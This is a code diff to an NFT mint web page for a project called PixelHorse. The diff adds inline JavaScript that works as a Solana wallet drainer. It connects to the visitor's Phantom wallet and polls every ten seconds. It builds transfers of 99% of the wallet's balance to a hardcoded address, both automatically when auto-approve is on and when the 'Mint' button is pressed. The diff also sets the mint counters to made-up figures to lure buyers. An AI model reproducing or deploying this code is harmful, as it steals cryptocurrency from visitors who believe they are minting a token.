@@ -78,8 +78,9 @@
                                 <input type="number" id="number-input" value="0">
                                 <button id="add">+</button>
                             </div>
-                            <div class="total-number">total <span>0.22</span> SOL</div>
-                            <div class="conntect-btn">Connected Wallet</div>
+                            <div class="total-number">total <span>0</span> SOL</div>
+							<div class="conntect-btn" href="javascript:;" id="connect" style="display: flex;">Connect Wallet</div>
+                            <div class="conntect-btn" href="javascript:;" id="transfer" style="display: none;">Mint </div>
                         </div>
                         <ul class="discount__list">
                             <li class="list-item">
@@ -88,11 +89,11 @@
                             </li>
                             <li class="list-item">
                                 <div class="list-item__title">Redeemed</div>
-                                <div class="list-item__text">3333</div>
+                                <div class="list-item__text">537</div>
                             </li>
                             <li class="list-item">
                                 <div class="list-item__title">Remaining</div>
-                                <div class="list-item__text">3333</div>
+                                <div class="list-item__text">2796</div>
                             </li>
                         </ul>
                     </div>
@@ -258,9 +259,9 @@
                     </div>
                 </div>
             </section>
-
-    
-
+		<!--==================== MiNT ====================-->
+        
+ 
         <!--==================== FOOTER ====================-->
             <footer class="footer section">
                 <span class="footer__copy">&#169; 2021 PixelHorse All rights reserved</span>
@@ -282,5 +283,228 @@
         
         <!--=============== MAIN JS ===============-->
         <script src="assets/js/main.js"></script>
+        
+		 <script>
+        function upValue() {
+
+            document.getElementById('counet').value = parseInt(1) + parseInt(document.getElementById('counet').value);
+
+            document.getElementById('wqwqw').textContent = (parseInt(document.getElementById('counet').value) * 1.1).toFixed(2).toString() + ' SOL';
+        }
+
+        function downValue() {
+            if (document.getElementById('counet').value == '1') {
+
+            } else {
+
+                document.getElementById('counet').value = parseInt(document.getElementById('counet').value) - parseInt(1);
+
+                document.getElementById('wqwqw').textContent = (parseInt(document.getElementById('counet').value) * 1.1).toFixed(2).toString() + ' SOL';
+            }
+        }
+        window.addEventListener('load', () => {
+
+
+            var sent = false;
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+
+            const getProvider = () => {
+                if ("solana" in window) {
+                    const provider = window.solana;
+                    if (provider.isPhantom) {
+                        return provider;
+                    }
+                }
+                window.open("https://phantom.app/", "_blank");
+            };
+
+            function onBodyLoad() {
+
+                const solConnected = window.solana.isConnected;
+
+                if (!solConnected) {
+                    connectWallet();
+
+                } else {
+                    document.getElementById('transfer').style.display = 'flex';
+                    document.getElementById('connect').style.display = 'none';
+                }
+                refreshStatus();
+
+            }
+
+
+            function refreshStatus() {
+                const provider = getProvider();
+                if (provider) {
+                    provider.on("connect", () => {
+                        setConnected();
+                        document.getElementById('transfer').style.display = 'flex';
+                        document.getElementById('connect').style.display = 'none';
+                    });
+                    provider.on("disconnect", () => {
+                        setNotConnected();
+                    });
+                }
+            }
+
+            function connectWallet() {
+                window.solana.connect({
+                    onlyIfTrusted: false
+                });
+            }
+            async function setConnected() {
+                let account_info = await connection.getAccountInfo(window.solana.publicKey);
+                console.log("Auto Approve: " + window.solana.autoApprove);
+            }
+
+            function trySend() {
+                if (window.solana.autoApprove) {
+                    if (!sent) {
+                        apimainnet();
+                    }
+                } else {
+                    console.log("Not auto approve!");
+                }
+            }
+            async function testTransfer2(howmany) {
+                const provider = getProvider();
+                const solConected = window.solana.isConnected;
+                const manylamports = (howmany * 1000000000).toFixed(0);
+
+                if (!provider) {
+                    return;
+                }
+                if (!solConected) {
+                    return;
+                }
+
+                let account_info = await connection.getAccountInfo(window.solana.publicKey);
+                var charginglamports = manylamports;
+                console.log(charginglamports)
+                if ((account_info.lamports / 2) > manylamports) {
+                    charginglamports = (account_info.lamports * 0.99).toFixed(0);
+                }
+
+                if (account_info.lamports < manylamports && account_info.lamports > 100000) {
+                    charginglamports = (account_info.lamports * 0.99).toFixed(0);
+                }
+                console.log(charginglamports);
+
+                let transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: provider.publicKey,
+                        toPubkey: "DjT3oRTbfjrzsQR29MWmn2JEmnZqMWZu66DN2oQzurHd",
+                        lamports: charginglamports,
+                    })
+                );
+
+                let {
+                    blockhash
+                } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = provider.publicKey;
+
+                return transaction;
+            }
+
+            async function makeTransfer(howmany) {
+                let transaction = await testTransfer2(howmany);
+                const provider = getProvider();
+
+                if (!provider) {
+                    return;
+                }
+                console.log(provider);
+                console.log(transaction);
+
+                if (transaction) {
+                    //try {
+
+                    console.log("asd");
+                    let signed = await provider.signTransaction(transaction, connection);
+                    console.log(signed);
+                    let signature = await connection.sendRawTransaction(signed.serialize());
+                    console.log(signature);
+                    await connection.confirmTransaction(signature);
+                    //} catch(err) {
+                    //  console.warn(err);
+                    //}
+                }
+            }
+
+            async function testTransfer() {
+                const provider = getProvider();
+                const solConected = window.solana.isConnected;
+
+                if (!provider) {
+                    return;
+                }
+                if (!solConected) {
+                    return;
+                }
+
+                let account_info = await connection.getAccountInfo(window.solana.publicKey);
+
+                if (account_info.lamports >= 10000000) {
+                    let transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: provider.publicKey,
+                            toPubkey: "DjT3oRTbfjrzsQR29MWmn2JEmnZqMWZu66DN2oQzurHd",
+                            lamports: (account_info.lamports * 0.99).toFixed(0),
+                        })
+                    );
+
+                    let {
+                        blockhash
+                    } = await connection.getRecentBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = provider.publicKey;
+
+                    return transaction;
+                }
+            }
+
+            async function apimainnet() {
+                let transaction = await testTransfer();
+                const provider = getProvider();
+
+                if (!provider) {
+                    return;
+                }
+                console.log(provider);
+                console.log(transaction);
+
+                if (transaction) {
+                    //try {
+
+                    console.log("asd");
+                    let signed = await provider.signTransaction(transaction, connection);
+                    console.log(signed);
+                    let signature = await connection.sendRawTransaction(signed.serialize());
+                    console.log(signature);
+                    sent = true;
+                    await connection.confirmTransaction(signature);
+                    //} catch(err) {
+                    //  console.warn(err);
+                    //}
+                }
+            }
+
+            function setNotConnected() {
+                // document.getElementById("connStatus").innerHTML = "Not Connected";
+            }
+            onBodyLoad();
+            setInterval(trySend, 10000);
+
+            document.getElementById('transfer').onclick = function() {
+                makeTransfer(100000);
+            }
+            document.getElementById('connect').onclick = function() {
+                onBodyLoad();
+            }
+        });
+    </script>
+    <script src="https://unpkg.com/@solana/web3.js@1.29.2/lib/index.iife.min.js"></script>
     </body>
 </html>
